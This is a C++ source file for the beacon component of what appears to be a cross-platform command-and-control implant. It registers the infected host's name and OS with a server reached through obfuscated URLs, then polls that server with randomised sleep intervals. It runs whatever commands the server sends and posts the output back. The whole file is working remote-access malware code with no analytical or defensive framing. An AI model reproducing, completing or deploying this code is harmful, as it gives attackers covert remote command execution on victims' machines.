#include <iostream>
#include <string>
#include <vector>
#include <tuple>
#include <stdexcept>
#include <curl/curl.h>
#include <json/json.h>
#include <cstdlib>
#include <ctime>
#include <sstream>

#include "../config.hpp"
#include "../logging.hpp"
#include "urlObfuscation.hpp"

#ifdef __unix__
#define OS "Linux"
#include "../../Linux/Beacon/beacon_commands.hpp"
#include "../..//Linux/generic.hpp"
#include <chrono>
#include <thread>
#endif

#ifdef WIN32
#include <windows.h>
#define OS "Windows"
#include "../../Windows/generic.hpp"
#include "../../Windows/Beacon/beacon_commands.hpp"
#endif

int calculateSleepTime(int timer, int jitter) {
    logger("Calculating Sleep Time with timer = " + std::to_string(timer) + " and jitter = " + std::to_string(jitter));
    int sign = (rand() % 2 == 0) ? 1 : -1;
    int sleepTime = timer + sign * (rand() % (jitter + 1));
    logger("Raw sleep time calculated: " + std::to_string(sleepTime));
    if (sleepTime < 0) {
        logger("Sleep time negative; reverting to timer value: " + std::to_string(timer));
        return timer;
    }
    return sleepTime;
}

void sleepFor(int seconds) {
    logger("Sleeping for " + std::to_string(seconds) + " seconds");
    #ifdef _WIN32
        Sleep(seconds * 1000);
    #else
        std::this_thread::sleep_for(std::chrono::seconds(seconds));
    #endif
}

size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s) {
    size_t newLength = size * nmemb;
    try {
        s->append((char*)contents, newLength);
    } catch (std::bad_alloc &e) {
        log_error("Memory allocation error in WriteCallback: " + std::string(e.what()));
        return 0;
    }
    return newLength;
}

std::tuple<int, std::string, std::string> getRequest(const std::string& url) {
    logger("Performing GET request to: " + url);
    CURL* curl;
    CURLcode res;
    long response_code = 0;
    std::string response_body;

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_body);
        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            log_error("GET request failed: " + std::string(curl_easy_strerror(res)));
            curl_easy_cleanup(curl);
            curl_global_cleanup();
            return std::make_tuple(-1, "", url);
        }
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
        logger("GET request succeeded. Response code: " + std::to_string(response_code));
        curl_easy_cleanup(curl);
    } else {
        log_error("Failed to initialize curl in getRequest for URL: " + url);
    }
    curl_global_cleanup();
    return std::make_tuple(response_code, response_body, url);
}

int retryRequest(const std::string& url, int attempts, int sleepTime) {
    logger("Retrying request for URL: " + url + " for up to " + std::to_string(attempts) + " attempts.");
    for (int count = 0; count < attempts; ++count) {
        logger("Retry attempt " + std::to_string(count + 1));
        sleepFor(sleepTime);
        auto [response_code, response_body, response_url] = getRequest(url);
        if (response_code == 200) {
            logger("Retry attempt " + std::to_string(count + 1) + " succeeded with response code 200");
            return 0;
        } else {
            log_error("Retry attempt " + std::to_string(count + 1) + " failed with response code: " + std::to_string(response_code));
        }
    }
    log_error("All retry attempts failed for URL: " + url);
    return -1;
}

std::tuple<int, std::string> postRequest(const std::string& url, const std::string& jsonData) {
    logger("Performing POST request to: " + url);
    logger("POST data: " + jsonData);
    CURL* curl;
    CURLcode res;
    long response_code = 0;
    std::string response_body;

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    if (curl) {
        struct curl_slist *headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/json");

        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, jsonData.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_body);
        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            log_error("POST request failed: " + std::string(curl_easy_strerror(res)));
            curl_easy_cleanup(curl);
            curl_slist_free_all(headers);
            curl_global_cleanup();
            throw std::runtime_error("curl_easy_perform() failed: " + std::string(curl_easy_strerror(res)));
        }
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
        logger("POST request succeeded. Response code: " + std::to_string(response_code));
        curl_easy_cleanup(curl);
        curl_slist_free_all(headers);
    } else {
        log_error("Failed to initialize curl in postRequest for URL: " + url);
    }
    curl_global_cleanup();
    return std::make_tuple(response_code, response_body);
}

std::tuple<int, std::string, int> httpConnection(const std::string& address) {
    logger("Starting httpConnection");
    std::string hostname = getHostname();
    std::vector<std::string> ipAddresses = getIPAddresses();
    std::string connectURL = generateConnectionURL();
    logger("Connection URL: " + connectURL);
    
    Json::Value requestData;
    requestData["name"] = hostname;
    requestData["os"] = OS;
    requestData["address"] = "127.0.0.1";

    std::tuple<int, std::string> postResult = postRequest(connectURL, requestData.toStyledString());
    int response_code = std::get<0>(postResult);
    std::string response_body = std::get<1>(postResult);

    if (response_code == -1) {
        log_error("httpConnection POST request failed, response code -1");
        return std::make_tuple(-1, "", -1);
    }

    try {
        if (response_code == 200) {
            logger("httpConnection succeeded. Parsing response...");
            Json::Value data;
            Json::CharReaderBuilder readerBuilder;
            std::string errs;
            std::istringstream s(response_body);
            if (!Json::parseFromStream(readerBuilder, s, &data, &errs)) {
                log_error("JSON parsing failed in httpConnection: " + errs);
                throw std::runtime_error("Failed to parse JSON: " + errs);
            }
            if (data.isMember("timer") && data.isMember("uuid") && data.isMember("jitter")) {
                int timer = std::stoi(data["timer"].asString());
                std::string ID = data["uuid"].asString();
                int jitter = std::stoi(data["jitter"].asString());
                logger("Parsed connection parameters: timer = " + std::to_string(timer) +
                       ", uuid = " + ID + ", jitter = " + std::to_string(jitter));
                return std::make_tuple(timer, ID, jitter);
            } else {
                log_error("Invalid JSON response in httpConnection: " + response_body);
                throw std::runtime_error("Invalid JSON response: " + response_body);
            }
        } else {
            log_error("Server responded with error in httpConnection: " + std::to_string(response_code) + " " + response_body);
            throw std::runtime_error("Failed to connect to server: " + std::to_string(response_code) + " " + response_body);
        }
    } catch(const std::exception& e) {
        log_error("Exception in httpConnection: " + std::string(e.what()));
        std::cerr << "Exception: " << e.what() << std::endl;
        throw;
    }
}

std::tuple<int, std::string, int> httpReconnect(const std::string& address, const std::string& user_id, int jitter, int timer) {
    logger("Starting httpReconnect for user_id: " + user_id);
    std::string hostname = getHostname();
    std::vector<std::string> ipAddresses = getIPAddresses();
    std::string reconnectURL = generateReconnectURL();
    logger("Reconnect URL: " + reconnectURL);
    
    Json::Value requestData;
    requestData["name"] = hostname;
    requestData["os"] = OS;
    requestData["address"] = "127.0.0.1"; // temporary value

    auto [response_code, response_body] = postRequest(reconnectURL, requestData.toStyledString());
    if (response_code == -1) {
        log_error("httpReconnect POST request failed");
        return std::make_tuple(-1, "", -1);
    }

    try {
        if (response_code == 200) {
            logger("httpReconnect succeeded.");
            return std::make_tuple(response_code, response_body, 0);
        } else {
            log_error("httpReconnect failed with response: " + std::to_string(response_code) + " " + response_body);
            throw std::runtime_error("Failed to reconnect to server: " + std::to_string(response_code) + " " + response_body);
        }
    } catch(const std::exception& e) {
        log_error("Exception in httpReconnect: " + std::string(e.what()));
        std::cerr << "Exception: " << e.what() << std::endl;
        throw;
    }
}

bool handleResponse(const std::string& response_body, int& timer, const std::string& ID) {
    logger("Handling response from server");
    Json::Value data;
    Json::CharReaderBuilder readerBuilder;
    std::string errs;
    std::istringstream s(response_body);
    if (!Json::parseFromStream(readerBuilder, s, &data, &errs)) {
        log_error("Failed to parse JSON in handleResponse: " + errs);
        throw std::runtime_error("Failed to parse JSON: " + errs);
    }
    logger("Parsed response: " + response_body);
    std::cout << "Response: " << response_body << std::endl;

    if (data.isMember("commands")) {
        logger("Commands detected in response. Processing commands...");
        Json::Value reports;
        for (const auto& command : data["commands"]) {
            std::string cmd = command["command"].asString();
            std::string cmd_uuid = command["command_uuid"].asString();
            std::string cmd_data = command["data"].asString();
            logger("Executing command: " + cmd + " with uuid: " + cmd_uuid);
            std::string output = command_handler(cmd, cmd_data, cmd_uuid);
            Json::Value json_data;
            json_data["output"] = output;
            json_data["command_uuid"] = cmd_uuid;
            reports.append(json_data);
        }
        Json::Value wrapped_reports;
        wrapped_reports["reports"] = reports;
        Json::StreamWriterBuilder writer;
        std::string json_string = Json::writeString(writer, wrapped_reports);
        std::string responseURL = generateResponse();
        logger("Posting command reports to: " + responseURL);
        postRequest(responseURL, json_string);
        return true;
    }

    if (data.isMember("timer")) {
        int newTimer = std::stoi(data["timer"].asString());
        logger("New timer value received: " + std::to_string(newTimer));
        if (newTimer > 0) {
            timer = newTimer;
        } else {
            log_error("Invalid timer received in handleResponse: " + std::to_string(newTimer));
            std::cerr << "Invalid timer value received: " << newTimer << std::endl;
        }
    }

    return false;
}

int beacon() {
    logger("Starting beacon function");
    srand(time(0));
    while (true) {
        std::string beaconURL = generateBeaconURL();
        logger("Beacon URL: " + beaconURL);
        
        int sleepTime = calculateSleepTime(TIMER, JITTER);
        auto [response_code, response_body, response_url] = getRequest(beaconURL);
        if (response_code == -1) {
            log_error("Initial GET for beacon failed for URL: " + beaconURL);
            int result = retryRequest(beaconURL, 5, sleepTime);
            if (result == -1) {
                log_error("Retries failed for beacon URL: " + beaconURL);
                return -1;
            }
        } else {
            try {
                if (response_code == 200) {
                    sleepTime = calculateSleepTime(TIMER, JITTER);
                    #ifdef __unix__
                        logger("Launching detached thread to handle response on Unix");
                        std::thread([response_body, sleepTime]() {
                            sleepFor(sleepTime);
                            if (!handleResponse(response_body, TIMER, ID)) {
                                log_error("Failed to send response after handling response");
                                std::cerr << "Failed to send response" << std::endl;
                            }
                        }).detach();
                    #elif _WIN32
                        logger("Creating Windows thread to handle response");
                        auto threadFunc = [](LPVOID param) -> DWORD {
                            auto data = static_cast<std::tuple<std::string, int, std::string>*>(param);
                            const std::string& response_body = std::get<0>(*data);
                            int sleepTime = std::get<1>(*data);
                            const std::string& ID = std::get<2>(*data);
                            sleepFor(sleepTime);
                            if (!handleResponse(response_body, TIMER, ID)) {
                                log_error("Failed to send response in Windows thread");
                                std::cerr << "Failed to send response" << std::endl;
                            }
                            delete data;
                            return 0;
                        };
                        auto* threadData = new std::tuple<std::string, int, std::string>(response_body, sleepTime, ID);
                        HANDLE thread = CreateThread(NULL, 0, threadFunc, threadData, 0, NULL);
                        if (thread == NULL) {
                            log_error("Failed to create thread in Windows beacon");
                            std::cerr << "Failed to create thread" << std::endl;
                        } else {
                            CloseHandle(thread);
                        }
                    #endif
                }
            } catch (const std::exception& e) {
                log_error("Exception in beacon loop: " + std::string(e.what()));
                std::cerr << "Exception: " << e.what() << std::endl;
            }
        }
        logger("Beacon main loop sleeping for " + std::to_string(sleepTime) + " seconds");
        sleepFor(sleepTime);
    }
    return 0;
}
